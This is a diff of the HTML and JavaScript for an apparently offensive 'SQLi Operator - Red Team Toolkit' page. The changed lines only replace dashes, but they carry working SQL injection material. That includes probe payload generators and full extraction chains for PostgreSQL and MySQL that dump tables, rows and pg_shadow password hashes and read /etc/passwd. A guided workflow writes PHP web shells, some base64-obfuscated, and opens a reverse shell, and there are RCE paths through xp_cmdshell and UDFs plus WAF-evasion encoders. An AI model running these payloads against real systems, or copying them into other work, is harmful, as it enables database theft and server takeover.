@@ -5,7 +5,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta name="description" content="SQL injection operator with payload generators, WAF transformers, and sqlmap command builders.">
     <meta name="theme-color" content="#020408">
-<title>SQLi Operator — Red Team Toolkit</title>
+<title>SQLi Operator - Red Team Toolkit</title>
     <link rel="icon" type="image/svg+xml" href="favicon.svg">
 <style>
 :root {
@@ -385,7 +385,7 @@ html, body {
     <div class="tab" onclick="unionTab(this,'data-extract')">5. Data Extraction</div>
   </div>
   <div id="union-tab-col-detection">
-    <div class="info-box"><strong>ORDER BY method:</strong> Increment until the page returns an error — the last successful number is your column count. Then confirm with UNION SELECT.</div>
+    <div class="info-box"><strong>ORDER BY method:</strong> Increment until the page returns an error - the last successful number is your column count. Then confirm with UNION SELECT.</div>
     <div id="union-orderby-payloads"></div>
     <div class="divider"></div>
     <div class="info-box"><strong>UNION NULL method:</strong> Try with increasing NULLs until no error.</div>
@@ -503,7 +503,7 @@ html, body {
       <div class="form-row"><div class="label">Web Root (for webshell write)</div><input type="text" class="input" id="err-webroot" value="/var/www/html" placeholder="/var/www/html" spellcheck="false"></div>
     </div>
     <div class="info-box" style="margin-top:10px;padding:8px 12px;font-size:11px">
-      <strong>Complete exploitation chain:</strong> Each DBMS generates the full sequence — Fingerprint &#8594; Enumerate DBs &#8594; Tables &#8594; Columns &#8594; Extract Data &#8594; Privileges &#8594; File Read &#8594; RCE/Webshell. Set <strong>Target Table</strong> and <strong>Web Root</strong> for targeted payloads.
+      <strong>Complete exploitation chain:</strong> Each DBMS generates the full sequence - Fingerprint &#8594; Enumerate DBs &#8594; Tables &#8594; Columns &#8594; Extract Data &#8594; Privileges &#8594; File Read &#8594; RCE/Webshell. Set <strong>Target Table</strong> and <strong>Web Root</strong> for targeted payloads.
     </div>
     <button class="btn btn-primary" style="margin-top:8px" onclick="generateErrorPayloads()">&#9889; Generate Full Chain</button>
   </div></div>
@@ -654,7 +654,7 @@ html, body {
 <div class="page" id="page-discovery-engine">
   <div class="section-header">
     <h1>🔍 SQLi Discovery Engine</h1>
-    <p>Systematic parameter discovery, polyglot generation, DBMS fingerprinting, response analysis, and WAF detection — all in one place.</p>
+    <p>Systematic parameter discovery, polyglot generation, DBMS fingerprinting, response analysis, and WAF detection - all in one place.</p>
   </div>
   
   <div class="tabs" id="de-tabs">
@@ -1060,8 +1060,8 @@ You have an error in your SQL syntax; check the manual... near ''/*P3*/' at line
     <!-- Guide State Display -->
     <div id="wiz-state-bar" style="display:none;margin:16px 0;padding:14px;background:var(--surface2);border:1px solid var(--border);border-radius:8px">
       <div style="display:flex;flex-wrap:wrap;gap:16px;align-items:center">
-        <div><span style="color:var(--text3);font-size:11px">INJECTABLE PARAM:</span> <strong id="wiz-state-param" style="color:var(--green)">—</strong></div>
-        <div><span style="color:var(--text3);font-size:11px">DBMS:</span> <strong id="wiz-state-dbms" style="color:var(--blue)">—</strong></div>
+        <div><span style="color:var(--text3);font-size:11px">INJECTABLE PARAM:</span> <strong id="wiz-state-param" style="color:var(--green)">-</strong></div>
+        <div><span style="color:var(--text3);font-size:11px">DBMS:</span> <strong id="wiz-state-dbms" style="color:var(--blue)">-</strong></div>
         <div><span style="color:var(--text3);font-size:11px">COLUMNS:</span> <strong id="wiz-state-cols" style="color:var(--amber)">?</strong></div>
         <div><span style="color:var(--text3);font-size:11px">TYPES:</span> <strong id="wiz-state-types" style="color:var(--teal)">?</strong></div>
         <div><span style="color:var(--text3);font-size:11px">VISIBLE COL:</span> <strong id="wiz-state-vis" style="color:var(--purple)">?</strong></div>
@@ -1263,7 +1263,7 @@ You have an error in your SQL syntax; check the manual... near ''/*P3*/' at line
         <div class="form-row">
           <div class="label">Override DBMS (optional)</div>
           <select class="select" id="amp-dbms-override">
-            <option value="">— Auto-detect —</option>
+            <option value="">- Auto-detect -</option>
             <option value="pgsql">PostgreSQL</option>
             <option value="mysql">MySQL/MariaDB</option>
             <option value="mssql">MSSQL</option>
@@ -1274,7 +1274,7 @@ You have an error in your SQL syntax; check the manual... near ''/*P3*/' at line
         <div class="form-row">
           <div class="label">Override Injection Type (optional)</div>
           <select class="select" id="amp-type-override">
-            <option value="">— Auto-detect —</option>
+            <option value="">- Auto-detect -</option>
             <option value="error">Error-Based</option>
             <option value="union">UNION-Based</option>
             <option value="blind-bool">Blind Boolean</option>
@@ -1295,11 +1295,11 @@ You have an error in your SQL syntax; check the manual... near ''/*P3*/' at line
   <!-- Detection Results -->
   <div id="amp-detection" style="display:none;margin:16px 0;padding:14px;background:var(--surface2);border:1px solid var(--border);border-radius:8px">
     <div style="display:flex;flex-wrap:wrap;gap:16px;align-items:center">
-      <div><span style="color:var(--text3);font-size:11px">DBMS:</span> <strong id="amp-det-dbms" style="color:var(--blue)">—</strong></div>
-      <div><span style="color:var(--text3);font-size:11px">INJECTION TYPE:</span> <strong id="amp-det-type" style="color:var(--green)">—</strong></div>
-      <div><span style="color:var(--text3);font-size:11px">PREFIX:</span> <code id="amp-det-prefix" style="color:var(--amber)">—</code></div>
-      <div><span style="color:var(--text3);font-size:11px">SUFFIX/COMMENT:</span> <code id="amp-det-suffix" style="color:var(--purple)">—</code></div>
-      <div><span style="color:var(--text3);font-size:11px">DATA SLOT:</span> <code id="amp-det-slot" style="color:var(--cyan)">—</code></div>
+      <div><span style="color:var(--text3);font-size:11px">DBMS:</span> <strong id="amp-det-dbms" style="color:var(--blue)">-</strong></div>
+      <div><span style="color:var(--text3);font-size:11px">INJECTION TYPE:</span> <strong id="amp-det-type" style="color:var(--green)">-</strong></div>
+      <div><span style="color:var(--text3);font-size:11px">PREFIX:</span> <code id="amp-det-prefix" style="color:var(--amber)">-</code></div>
+      <div><span style="color:var(--text3);font-size:11px">SUFFIX/COMMENT:</span> <code id="amp-det-suffix" style="color:var(--purple)">-</code></div>
+      <div><span style="color:var(--text3);font-size:11px">DATA SLOT:</span> <code id="amp-det-slot" style="color:var(--cyan)">-</code></div>
     </div>
   </div>
 
@@ -1424,45 +1424,45 @@ You have an error in your SQL syntax; check the manual... near ''/*P3*/' at line
           <div class="form-row">
             <div class="label">Failure Mode</div>
             <select class="select" id="corr-failure">
-              <option value="">— Select failure mode —</option>
+              <option value="">- Select failure mode -</option>
               <optgroup label="Parameter Discovery">
-                <option value="param-silent">param-silent — No errors on any param</option>
-                <option value="param-partial">param-partial — Errors on some params only</option>
+                <option value="param-silent">param-silent - No errors on any param</option>
+                <option value="param-partial">param-partial - Errors on some params only</option>
               </optgroup>
               <optgroup label="UNION Issues">
-                <option value="type-mismatch">type-mismatch — Column type mismatch</option>
-                <option value="union-empty">union-empty — UNION returns no data</option>
-                <option value="col-count">col-count — Wrong column count</option>
+                <option value="type-mismatch">type-mismatch - Column type mismatch</option>
+                <option value="union-empty">union-empty - UNION returns no data</option>
+                <option value="col-count">col-count - Wrong column count</option>
               </optgroup>
               <optgroup label="Extraction Confirmed">
-                <option value="cast-confirmed">cast-confirmed — CAST/CONVERT works</option>
-                <option value="cast-truncate">cast-truncate — Output truncated</option>
-                <option value="truncated">truncated — Data cut off</option>
-                <option value="multiline-extract">multiline — Need multiple rows</option>
-                <option value="data-empty">data-empty — Table appears empty</option>
+                <option value="cast-confirmed">cast-confirmed - CAST/CONVERT works</option>
+                <option value="cast-truncate">cast-truncate - Output truncated</option>
+                <option value="truncated">truncated - Data cut off</option>
+                <option value="multiline-extract">multiline - Need multiple rows</option>
+                <option value="data-empty">data-empty - Table appears empty</option>
               </optgroup>
               <optgroup label="Blind Issues">
-                <option value="timing-unreliable">timing-unreliable — Jitter/inconsistent</option>
-                <option value="blind-slow">blind-slow — Extraction too slow</option>
+                <option value="timing-unreliable">timing-unreliable - Jitter/inconsistent</option>
+                <option value="blind-slow">blind-slow - Extraction too slow</option>
               </optgroup>
               <optgroup label="DBMS-Specific">
-                <option value="sqlite-enum">sqlite-enum — SQLite enumeration</option>
+                <option value="sqlite-enum">sqlite-enum - SQLite enumeration</option>
               </optgroup>
               <optgroup label="Evasion">
-                <option value="waf-blocked">waf-blocked — WAF blocking keywords</option>
+                <option value="waf-blocked">waf-blocked - WAF blocking keywords</option>
               </optgroup>
               <optgroup label="RCE Paths">
-                <option value="pg-rce">pg-rce — PostgreSQL RCE</option>
-                <option value="mssql-rce">mssql-rce — MSSQL xp_cmdshell</option>
-                <option value="mysql-udf">mysql-udf — MySQL UDF</option>
+                <option value="pg-rce">pg-rce - PostgreSQL RCE</option>
+                <option value="mssql-rce">mssql-rce - MSSQL xp_cmdshell</option>
+                <option value="mysql-udf">mysql-udf - MySQL UDF</option>
               </optgroup>
               <optgroup label="Special Contexts">
-                <option value="insert-ctx">insert-ctx — INSERT context</option>
-                <option value="json-inject">json-inject — JSON body</option>
-                <option value="header-inject">header-inject — HTTP headers</option>
-                <option value="second-order">second-order — Stored SQLi</option>
-                <option value="oob-needed">oob-needed — Need OOB exfil</option>
-                <option value="xpath-error">xpath-error — XPath injection</option>
+                <option value="insert-ctx">insert-ctx - INSERT context</option>
+                <option value="json-inject">json-inject - JSON body</option>
+                <option value="header-inject">header-inject - HTTP headers</option>
+                <option value="second-order">second-order - Stored SQLi</option>
+                <option value="oob-needed">oob-needed - Need OOB exfil</option>
+                <option value="xpath-error">xpath-error - XPath injection</option>
               </optgroup>
             </select>
           </div>
@@ -1502,7 +1502,7 @@ You have an error in your SQL syntax; check the manual... near ''/*P3*/' at line
 
 <!-- ══ RCE PATHS ══ (NEW) -->
 <div class="page" id="page-rce-paths">
-  <div class="section-header"><h1>🚀 RCE Paths</h1><p>Command execution via SQL injection — PostgreSQL, MSSQL, MySQL UDF, SQLite ATTACH.</p></div>
+  <div class="section-header"><h1>🚀 RCE Paths</h1><p>Command execution via SQL injection - PostgreSQL, MSSQL, MySQL UDF, SQLite ATTACH.</p></div>
   <div class="tabs">
     <div class="tab active" onclick="rceTab(this,'pgsql')">PostgreSQL</div>
     <div class="tab" onclick="rceTab(this,'mssql')">MSSQL</div>
@@ -1515,7 +1515,7 @@ You have an error in your SQL syntax; check the manual... near ''/*P3*/' at line
 <div class="page" id="page-file-ops">
   <div class="section-header"><h1>📁 File Operations</h1><p>Full guided workflow: privilege check → read files → write proof → deploy web shell with reverse shell.</p></div>
   <div class="card" style="margin-bottom:12px;border-color:var(--teal)">
-    <div class="card-header" style="background:rgba(45,212,191,.08)"><div class="card-title" style="color:var(--teal)">⚙ Injection Context — configure once, used everywhere</div></div>
+    <div class="card-header" style="background:rgba(45,212,191,.08)"><div class="card-title" style="color:var(--teal)">⚙ Injection Context - configure once, used everywhere</div></div>
     <div class="card-body">
       <div class="form-grid">
         <div class="form-row"><div class="label">Injection Prefix</div><input type="text" class="input" id="fo-prefix" value="cn'" spellcheck="false" oninput="foRefresh()"></div>
@@ -1530,11 +1530,11 @@ You have an error in your SQL syntax; check the manual... near ''/*P3*/' at line
     </div>
   </div>
   <div class="tabs">
-    <div class="tab active" onclick="fileTab(this,'check')">Step 0 — Verify Privileges</div>
-    <div class="tab" onclick="fileTab(this,'read')">Step 1 — Read Files</div>
-    <div class="tab" onclick="fileTab(this,'write')">Step 2 — Write Test</div>
-    <div class="tab" onclick="fileTab(this,'webshell')">Step 3 — Web Shell</div>
-    <div class="tab" onclick="fileTab(this,'revshell')">Step 4 — Rev Shell</div>
+    <div class="tab active" onclick="fileTab(this,'check')">Step 0 - Verify Privileges</div>
+    <div class="tab" onclick="fileTab(this,'read')">Step 1 - Read Files</div>
+    <div class="tab" onclick="fileTab(this,'write')">Step 2 - Write Test</div>
+    <div class="tab" onclick="fileTab(this,'webshell')">Step 3 - Web Shell</div>
+    <div class="tab" onclick="fileTab(this,'revshell')">Step 4 - Rev Shell</div>
   </div>
   <div id="file-tab-check">
     <div class="info-box">Run in order. You need: FILE privilege ✓ + secure_file_priv empty or accessible ✓. If both pass, proceed to Step 1.</div>
@@ -1553,8 +1553,8 @@ You have an error in your SQL syntax; check the manual... near ''/*P3*/' at line
         <div class="form-row"><div class="label">File Path to Read</div><input type="text" class="input" id="file-read-path" value="/etc/passwd" spellcheck="false"></div>
         <div class="form-row"><div class="label">Encode Path</div><select class="select" id="file-read-enc">
           <option value="none">Plain text</option>
-          <option value="hex">Hex (0x…) — bypass quote filter</option>
-          <option value="char">CHAR() — bypass quote filter</option>
+          <option value="hex">Hex (0x…) - bypass quote filter</option>
+          <option value="char">CHAR() - bypass quote filter</option>
         </select></div>
       </div>
       <div style="display:flex;gap:8px;margin-top:8px;flex-wrap:wrap">
@@ -1565,7 +1565,7 @@ You have an error in your SQL syntax; check the manual... near ''/*P3*/' at line
     </div></div>
     <div id="file-read-output" style="margin-top:12px"></div>
     <div class="divider"></div>
-    <div class="card"><div class="card-header"><div class="card-title">📋 Click to Read — Common Sensitive Files</div><div class="label" style="font-size:10px;color:var(--text3)">click any file to generate payload</div></div><div class="card-body no-pad" id="common-files-list"></div></div>
+    <div class="card"><div class="card-header"><div class="card-title">📋 Click to Read - Common Sensitive Files</div><div class="label" style="font-size:10px;color:var(--text3)">click any file to generate payload</div></div><div class="card-body no-pad" id="common-files-list"></div></div>
   </div>
   <div id="file-tab-write" style="display:none">
     <div class="info-box">First write a harmless proof file. If it appears at the URL, you have write access. Then proceed to Step 3.</div>
@@ -1574,12 +1574,12 @@ You have an error in your SQL syntax; check the manual... near ''/*P3*/' at line
         <div class="form-row"><div class="label">Proof Filename</div><input type="text" class="input" id="file-write-name" value="proof.txt" spellcheck="false"></div>
         <div class="form-row"><div class="label">Proof Content</div><input type="text" class="input" id="file-write-content" value="file written successfully!" spellcheck="false"></div>
         <div class="form-row"><div class="label">Write Method</div><select class="select" id="file-write-method">
-          <option value="outfile">INTO OUTFILE — multiple rows, readable text</option>
-          <option value="dumpfile">INTO DUMPFILE — single row, no newline (binary)</option>
+          <option value="outfile">INTO OUTFILE - multiple rows, readable text</option>
+          <option value="dumpfile">INTO DUMPFILE - single row, no newline (binary)</option>
         </select></div>
         <div class="form-row"><div class="label">Use Empty Cols (clean output)</div><select class="select" id="file-write-empty">
-          <option value="yes">Yes — use empty strings for junk cols</option>
-          <option value="no">No — use numbers 1,2,3…</option>
+          <option value="yes">Yes - use empty strings for junk cols</option>
+          <option value="no">No - use numbers 1,2,3…</option>
         </select></div>
       </div>
       <button class="btn btn-primary" onclick="generateFileWrite()">Generate Write Payloads</button>
@@ -1593,12 +1593,12 @@ You have an error in your SQL syntax; check the manual... near ''/*P3*/' at line
       <div class="form-grid">
         <div class="form-row"><div class="label">Shell Filename</div><input type="text" class="input" id="ws-filename" value="shell.php" spellcheck="false"></div>
         <div class="form-row"><div class="label">Shell Type</div><select class="select" id="ws-type">
-          <option value="minimal">Minimal — system($_GET[0])</option>
-          <option value="request">$_REQUEST[0] — POST or GET</option>
+          <option value="minimal">Minimal - system($_GET[0])</option>
+          <option value="request">$_REQUEST[0] - POST or GET</option>
           <option value="exec">exec() + output array</option>
-          <option value="passthru">passthru() — raw output</option>
-          <option value="b64eval">Base64 eval — obfuscated</option>
-          <option value="b64post">Base64 POST body — stealthy</option>
+          <option value="passthru">passthru() - raw output</option>
+          <option value="b64eval">Base64 eval - obfuscated</option>
+          <option value="b64post">Base64 POST body - stealthy</option>
         </select></div>
         <div class="form-row"><div class="label">Write Method</div><select class="select" id="ws-method">
           <option value="outfile">INTO OUTFILE</option>
@@ -1721,8 +1721,8 @@ You have an error in your SQL syntax; check the manual... near ''/*P3*/' at line
   <div class="section-header"><h1>📡 Stacked Queries & Out-of-Band</h1><p>Stacked (batched) query injection and OOB data exfiltration via DNS/HTTP channels.</p></div>
   <div class="tabs">
     <div class="tab active" onclick="stackedTab(this,'stacked')">Stacked Queries</div>
-    <div class="tab" onclick="stackedTab(this,'oob-dns')">OOB — DNS</div>
-    <div class="tab" onclick="stackedTab(this,'oob-http')">OOB — HTTP</div>
+    <div class="tab" onclick="stackedTab(this,'oob-dns')">OOB - DNS</div>
+    <div class="tab" onclick="stackedTab(this,'oob-http')">OOB - HTTP</div>
     <div class="tab" onclick="stackedTab(this,'order-by')">ORDER BY</div>
     <div class="tab" onclick="stackedTab(this,'second-order')">Second-Order</div>
     <div class="tab" onclick="stackedTab(this,'sqlite-stacked')">SQLite</div>
@@ -1838,18 +1838,18 @@ You have an error in your SQL syntax; check the manual... near ''/*P3*/' at line
   <div class="section-header"><h1>🔤 Encoder / Decoder Suite</h1><p>Real-time encoding and decoding for payload obfuscation and WAF evasion.</p></div>
   <div class="form-row"><div class="label">Input String</div><textarea class="textarea" id="enc-input" placeholder="Enter string or payload to encode/decode..." spellcheck="false" oninput="encodeAll()"></textarea></div>
   <div class="grid-2" style="margin-top:12px">
-    <div class="card"><div class="card-header"><div class="card-title">URL Encode</div><button class="btn btn-copy" onclick="copyText(document.getElementById('out-url').textContent)">Copy</button></div><div class="card-body"><div class="enc-output" id="out-url">—</div></div></div>
-    <div class="card"><div class="card-header"><div class="card-title">URL Decode</div><button class="btn btn-copy" onclick="copyText(document.getElementById('out-urld').textContent)">Copy</button></div><div class="card-body"><div class="enc-output" id="out-urld">—</div></div></div>
-    <div class="card"><div class="card-header"><div class="card-title">Base64 Encode</div><button class="btn btn-copy" onclick="copyText(document.getElementById('out-b64').textContent)">Copy</button></div><div class="card-body"><div class="enc-output" id="out-b64">—</div></div></div>
-    <div class="card"><div class="card-header"><div class="card-title">Base64 Decode</div><button class="btn btn-copy" onclick="copyText(document.getElementById('out-b64d').textContent)">Copy</button></div><div class="card-body"><div class="enc-output" id="out-b64d">—</div></div></div>
-    <div class="card"><div class="card-header"><div class="card-title">Hex Encode (0x…)</div><button class="btn btn-copy" onclick="copyText(document.getElementById('out-hex').textContent)">Copy</button></div><div class="card-body"><div class="enc-output" id="out-hex">—</div></div></div>
-    <div class="card"><div class="card-header"><div class="card-title">Hex Decode</div><button class="btn btn-copy" onclick="copyText(document.getElementById('out-hexd').textContent)">Copy</button></div><div class="card-body"><div class="enc-output" id="out-hexd">—</div></div></div>
-    <div class="card"><div class="card-header"><div class="card-title">CHAR() Encode</div><button class="btn btn-copy" onclick="copyText(document.getElementById('out-char').textContent)">Copy</button></div><div class="card-body"><div class="enc-output" id="out-char">—</div></div></div>
-    <div class="card"><div class="card-header"><div class="card-title">Double URL Encode</div><button class="btn btn-copy" onclick="copyText(document.getElementById('out-durl').textContent)">Copy</button></div><div class="card-body"><div class="enc-output" id="out-durl">—</div></div></div>
-    <div class="card"><div class="card-header"><div class="card-title">HTML Entities</div><button class="btn btn-copy" onclick="copyText(document.getElementById('out-html').textContent)">Copy</button></div><div class="card-body"><div class="enc-output" id="out-html">—</div></div></div>
-    <div class="card"><div class="card-header"><div class="card-title">MySQL Hex String</div><button class="btn btn-copy" onclick="copyText(document.getElementById('out-mhex').textContent)">Copy</button></div><div class="card-body"><div class="enc-output" id="out-mhex">—</div></div></div>
-    <div class="card"><div class="card-header"><div class="card-title">Unicode Escape (\uXXXX)</div><button class="btn btn-copy" onclick="copyText(document.getElementById('out-unicode').textContent)">Copy</button></div><div class="card-body"><div class="enc-output" id="out-unicode">—</div></div></div>
-    <div class="card"><div class="card-header"><div class="card-title">ROT13</div><button class="btn btn-copy" onclick="copyText(document.getElementById('out-rot13').textContent)">Copy</button></div><div class="card-body"><div class="enc-output" id="out-rot13">—</div></div></div>
+    <div class="card"><div class="card-header"><div class="card-title">URL Encode</div><button class="btn btn-copy" onclick="copyText(document.getElementById('out-url').textContent)">Copy</button></div><div class="card-body"><div class="enc-output" id="out-url">-</div></div></div>
+    <div class="card"><div class="card-header"><div class="card-title">URL Decode</div><button class="btn btn-copy" onclick="copyText(document.getElementById('out-urld').textContent)">Copy</button></div><div class="card-body"><div class="enc-output" id="out-urld">-</div></div></div>
+    <div class="card"><div class="card-header"><div class="card-title">Base64 Encode</div><button class="btn btn-copy" onclick="copyText(document.getElementById('out-b64').textContent)">Copy</button></div><div class="card-body"><div class="enc-output" id="out-b64">-</div></div></div>
+    <div class="card"><div class="card-header"><div class="card-title">Base64 Decode</div><button class="btn btn-copy" onclick="copyText(document.getElementById('out-b64d').textContent)">Copy</button></div><div class="card-body"><div class="enc-output" id="out-b64d">-</div></div></div>
+    <div class="card"><div class="card-header"><div class="card-title">Hex Encode (0x…)</div><button class="btn btn-copy" onclick="copyText(document.getElementById('out-hex').textContent)">Copy</button></div><div class="card-body"><div class="enc-output" id="out-hex">-</div></div></div>
+    <div class="card"><div class="card-header"><div class="card-title">Hex Decode</div><button class="btn btn-copy" onclick="copyText(document.getElementById('out-hexd').textContent)">Copy</button></div><div class="card-body"><div class="enc-output" id="out-hexd">-</div></div></div>
+    <div class="card"><div class="card-header"><div class="card-title">CHAR() Encode</div><button class="btn btn-copy" onclick="copyText(document.getElementById('out-char').textContent)">Copy</button></div><div class="card-body"><div class="enc-output" id="out-char">-</div></div></div>
+    <div class="card"><div class="card-header"><div class="card-title">Double URL Encode</div><button class="btn btn-copy" onclick="copyText(document.getElementById('out-durl').textContent)">Copy</button></div><div class="card-body"><div class="enc-output" id="out-durl">-</div></div></div>
+    <div class="card"><div class="card-header"><div class="card-title">HTML Entities</div><button class="btn btn-copy" onclick="copyText(document.getElementById('out-html').textContent)">Copy</button></div><div class="card-body"><div class="enc-output" id="out-html">-</div></div></div>
+    <div class="card"><div class="card-header"><div class="card-title">MySQL Hex String</div><button class="btn btn-copy" onclick="copyText(document.getElementById('out-mhex').textContent)">Copy</button></div><div class="card-body"><div class="enc-output" id="out-mhex">-</div></div></div>
+    <div class="card"><div class="card-header"><div class="card-title">Unicode Escape (\uXXXX)</div><button class="btn btn-copy" onclick="copyText(document.getElementById('out-unicode').textContent)">Copy</button></div><div class="card-body"><div class="enc-output" id="out-unicode">-</div></div></div>
+    <div class="card"><div class="card-header"><div class="card-title">ROT13</div><button class="btn btn-copy" onclick="copyText(document.getElementById('out-rot13').textContent)">Copy</button></div><div class="card-body"><div class="enc-output" id="out-rot13">-</div></div></div>
   </div>
 </div>
 
@@ -1882,7 +1882,7 @@ You have an error in your SQL syntax; check the manual... near ''/*P3*/' at line
 
 <!-- ══ PORTSWIGGER MAP ══ -->
 <div class="page" id="page-portswigger">
-  <div class="section-header"><h1>🔬 PortSwigger Web Security Academy</h1><p>Official SQLi learning path — click any topic to open lab directly.</p></div>
+  <div class="section-header"><h1>🔬 PortSwigger Web Security Academy</h1><p>Official SQLi learning path - click any topic to open lab directly.</p></div>
   <div id="portswigger-content"></div>
 </div>
 
@@ -1926,7 +1926,7 @@ You have an error in your SQL syntax; check the manual... near ''/*P3*/' at line
 // UTILITIES
 // ═══════════════════════════════════════════════
 function copyText(text) {
-  if (!text || text === '—') return;
+  if (!text || text === '-') return;
   if (navigator.clipboard) {
     navigator.clipboard.writeText(text).then(() => showNotif('Copied!','success')).catch(() => fallbackCopy(text));
   } else { fallbackCopy(text); }
@@ -2044,12 +2044,12 @@ function genTimeSweep(params, dbms, prefix, comment, sleepSec) {
   const sleep = sleepMap[dbms] || sleepMap.mysql;
   const payloads = [];
   if (!params || params.length===0) {
-    payloads.push({payload:`${prefix} AND (SELECT ${sleep})${comment}`, desc:`Time probe — ${sleepSec}s delay = injectable`});
+    payloads.push({payload:`${prefix} AND (SELECT ${sleep})${comment}`, desc:`Time probe - ${sleepSec}s delay = injectable`});
     return payloads;
   }
   params.forEach((param, idx) => {
     let inj = dbms==='mssql' ? `${prefix}; ${sleep}${comment}` : `${prefix} AND (SELECT ${sleep})${comment}`;
-    payloads.push({payload: genBurpBody(params, idx, inj, true), desc:`TIME param[${idx}] "${param.name}" — ${sleepSec}s delay = injectable`});
+    payloads.push({payload: genBurpBody(params, idx, inj, true), desc:`TIME param[${idx}] "${param.name}" - ${sleepSec}s delay = injectable`});
   });
   return payloads;
 }
@@ -2067,11 +2067,11 @@ function genErrorSweep(params, dbms, prefix, comment) {
   const inj = errMap[dbms] || errMap.mysql;
   const payloads = [];
   if (!params || params.length===0) {
-    payloads.push({payload: inj, desc:'Error probe — SQL error message = injectable'});
+    payloads.push({payload: inj, desc:'Error probe - SQL error message = injectable'});
     return payloads;
   }
   params.forEach((param, idx) => {
-    payloads.push({payload: genBurpBody(params, idx, inj, true), desc:`ERROR param[${idx}] "${param.name}" — SQL error = injectable`});
+    payloads.push({payload: genBurpBody(params, idx, inj, true), desc:`ERROR param[${idx}] "${param.name}" - SQL error = injectable`});
   });
   return payloads;
 }
@@ -2082,12 +2082,12 @@ function genBoolSweep(params, prefix, comment) {
   const payloads = [];
   if (!params || params.length===0) {
     payloads.push({payload:`${prefix} AND 1=1${comment}`, desc:'Boolean TRUE (baseline)'});
-    payloads.push({payload:`${prefix} AND 1=2${comment}`, desc:'Boolean FALSE — compare with TRUE'});
+    payloads.push({payload:`${prefix} AND 1=2${comment}`, desc:'Boolean FALSE - compare with TRUE'});
     return payloads;
   }
   params.forEach((param, idx) => {
     payloads.push({payload: genBurpBody(params, idx, `${prefix} AND 1=1${comment}`, true), desc:`BOOL TRUE param[${idx}] "${param.name}"`});
-    payloads.push({payload: genBurpBody(params, idx, `${prefix} AND 1=2${comment}`, true), desc:`BOOL FALSE param[${idx}] "${param.name}" — diff = injectable`});
+    payloads.push({payload: genBurpBody(params, idx, `${prefix} AND 1=2${comment}`, true), desc:`BOOL FALSE param[${idx}] "${param.name}" - diff = injectable`});
   });
   return payloads;
 }
@@ -2105,40 +2105,40 @@ function genCastChain(params, targetIndex, dbms, tableTarget, colsTarget) {
   const payloads = [];
 
   if (dbms==='pgsql') {
-    payloads.push({payload:p("' AND 1=CAST((SELECT current_user) AS integer)--"), desc:'PgSQL — current user'});
-    payloads.push({payload:p("' AND 1=CAST((SELECT current_database()) AS integer)--"), desc:'PgSQL — current database'});
-    payloads.push({payload:p("' AND 1=CAST((SELECT version()) AS integer)--"), desc:'PgSQL — version'});
-    payloads.push({payload:p("' AND 1=CAST((SELECT string_agg(table_name,',') FROM information_schema.tables WHERE table_schema='public') AS integer)--"), desc:'PgSQL — all public tables'});
-    payloads.push({payload:p(`' AND 1=CAST((SELECT string_agg(column_name,',') FROM information_schema.columns WHERE table_name='${tableTarget}') AS integer)--`), desc:`PgSQL — columns of ${tableTarget}`});
-    for(let i=0;i<10;i++) payloads.push({payload:p(`' AND 1=CAST((SELECT ${colConcat} FROM ${tableTarget} LIMIT 1 OFFSET ${i}) AS integer)--`), desc:`PgSQL — row ${i+1}`});
-    payloads.push({payload:p(`' AND 1=CAST((SELECT string_agg(${colConcat},chr(10)) FROM ${tableTarget}) AS integer)--`), desc:'PgSQL — all rows'});
-    payloads.push({payload:p("' AND 1=CAST((SELECT usesuper::text FROM pg_user WHERE usename=current_user) AS integer)--"), desc:'PgSQL — is superuser?'});
-    payloads.push({payload:p("' AND 1=CAST((SELECT string_agg(usename||':'||passwd,',') FROM pg_shadow) AS integer)--"), desc:'PgSQL — pg_shadow hashes'});
-    payloads.push({payload:p("' AND 1=CAST(pg_read_file('/etc/passwd',0,500) AS integer)--"), desc:'PgSQL — read /etc/passwd'});
+    payloads.push({payload:p("' AND 1=CAST((SELECT current_user) AS integer)--"), desc:'PgSQL - current user'});
+    payloads.push({payload:p("' AND 1=CAST((SELECT current_database()) AS integer)--"), desc:'PgSQL - current database'});
+    payloads.push({payload:p("' AND 1=CAST((SELECT version()) AS integer)--"), desc:'PgSQL - version'});
+    payloads.push({payload:p("' AND 1=CAST((SELECT string_agg(table_name,',') FROM information_schema.tables WHERE table_schema='public') AS integer)--"), desc:'PgSQL - all public tables'});
+    payloads.push({payload:p(`' AND 1=CAST((SELECT string_agg(column_name,',') FROM information_schema.columns WHERE table_name='${tableTarget}') AS integer)--`), desc:`PgSQL - columns of ${tableTarget}`});
+    for(let i=0;i<10;i++) payloads.push({payload:p(`' AND 1=CAST((SELECT ${colConcat} FROM ${tableTarget} LIMIT 1 OFFSET ${i}) AS integer)--`), desc:`PgSQL - row ${i+1}`});
+    payloads.push({payload:p(`' AND 1=CAST((SELECT string_agg(${colConcat},chr(10)) FROM ${tableTarget}) AS integer)--`), desc:'PgSQL - all rows'});
+    payloads.push({payload:p("' AND 1=CAST((SELECT usesuper::text FROM pg_user WHERE usename=current_user) AS integer)--"), desc:'PgSQL - is superuser?'});
+    payloads.push({payload:p("' AND 1=CAST((SELECT string_agg(usename||':'||passwd,',') FROM pg_shadow) AS integer)--"), desc:'PgSQL - pg_shadow hashes'});
+    payloads.push({payload:p("' AND 1=CAST(pg_read_file('/etc/passwd',0,500) AS integer)--"), desc:'PgSQL - read /etc/passwd'});
   } else if (dbms==='mysql') {
-    payloads.push({payload:p("' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))-- -"), desc:'MySQL — version'});
-    payloads.push({payload:p("' AND EXTRACTVALUE(1,CONCAT(0x7e,user()))-- -"), desc:'MySQL — current user'});
-    payloads.push({payload:p("' AND EXTRACTVALUE(1,CONCAT(0x7e,database()))-- -"), desc:'MySQL — current database'});
-    payloads.push({payload:p("' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata)))-- -"), desc:'MySQL — all databases'});
-    payloads.push({payload:p("' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database())))-- -"), desc:'MySQL — all tables'});
-    payloads.push({payload:p(`' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='${tableTarget}')))-- -`), desc:`MySQL — columns of ${tableTarget}`});
